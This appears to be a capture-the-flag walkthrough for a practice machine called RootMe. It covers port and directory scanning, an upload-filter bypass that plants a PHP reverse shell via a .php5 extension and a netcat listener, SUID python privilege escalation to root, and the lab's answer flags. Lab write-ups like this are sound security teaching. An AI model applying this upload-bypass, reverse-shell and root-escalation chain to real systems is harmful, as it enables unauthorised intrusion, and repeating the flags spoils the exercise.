# [Task 2] Reconnaissance

## #2.1 - Scan the machine, how many ports are open?

Nmap reveals that there are 2 open ports, respectively `ssh` and `http` on ports `22/tcp` and `80/tcp`.

~~~
$ nmap -sC -sV -A 10.10.180.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 19:49 CEST
Nmap scan report for 10.10.180.101
Host is up (0.048s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.52 seconds
~~~

Answer: `2`

## #2.2 - What version of Apache are running?

Answer: `2.4.29`

## #2.3 - What service is running on port 22?

Answer: `ssh`

## #2.4 - Find directories on the web server using the GoBuster tool.

Enumerating the web service with gobuster reveals 2 interesting hidden locations: `/panel` and `/uploads`.

~~~
kali@kali:/data/RootMe$ gobuster dir -u http://10.10.180.101 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.180.101
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/14 19:52:48 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/09/14 19:53:33 Finished
===============================================================
~~~

## #2.5 - What is the hidden directory?

Answer: `/panel/`

# [Task 3] Getting a shell

## #3.1 - Find a form to upload and get a reverse shell, and find the flag (`user.txt`)

Trying to upload a `*.php` file (you can download a PHP reverse shell from [pentestmonkey](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz)) produces the following error message:

~~~
PHP não é permitido!
~~~

All you need to do is to use the `*.php5` extension (e.g. `shell.php5`) and upload the file. Once done, start a listener:

~~~
$ rlwrap nc -nlvp 4444
~~~

And call the PHP reverse shell:

~~~
$ curl http://10.10.180.101/uploads/shell.php5
~~~

In our reverse shell:

~~~
kali@kali:/data/RootMe/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.180.101] 34592
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:08:42 up 21 min,  0 users,  load average: 0.00, 0.06, 0.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
~~~

Now, let's get the user flag:

~~~
$ cd /var/www
$ ls -la
total 20
drwxr-xr-x  3 www-data www-data 4096 Aug  4 17:54 .
drwxr-xr-x 14 root     root     4096 Aug  4 15:08 ..
-rw-------  1 www-data www-data  129 Aug  4 17:54 .bash_history
drwxr-xr-x  6 www-data www-data 4096 Aug  4 17:19 html
-rw-r--r--  1 www-data www-data   21 Aug  4 17:30 user.txt
$ cat user.txt
THM{y0u_g0t_a_sh3ll}
~~~

Answer: `THM{y0u_g0t_a_sh3ll}`


# [Task 4] Privilege escalation

Now that we have a shell, let's escalate our privileges to root.

## #4.1 - Search for files with SUID permission, which file is weird?

Checking for files owned by `root` with the `SUID` bit set reveals that `python` is one of them:

~~~
bash-4.4$ find / -type f -user root -perm -u=s 2>/dev/null

[REDACTED]

/usr/bin/python

[REDACTED]
~~~

Answer: `/usr/bin/python`

## #4.2 - Find a form to escalate your privileges.

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) confirms that we can take advantage of it to elevate our privileges:

~~~
bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
~~~

## #4.3 - root.txt

Let's get the root flag:

~~~
# cd /root
cd /root
# ls -la
ls -la
total 40
drwx------  6 root root 4096 Aug  4 17:54 .
drwxr-xr-x 24 root root 4096 Aug  4 14:54 ..
-rw-------  1 root root 1423 Aug  4 17:54 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug  4 17:08 .cache
drwx------  3 root root 4096 Aug  4 17:08 .gnupg
drwxr-xr-x  3 root root 4096 Aug  4 16:26 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Aug  4 15:03 .ssh
-rw-r--r--  1 root root   26 Aug  4 17:31 root.txt
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
~~~

Answer: `THM{pr1v1l3g3_3sc4l4t10n}`
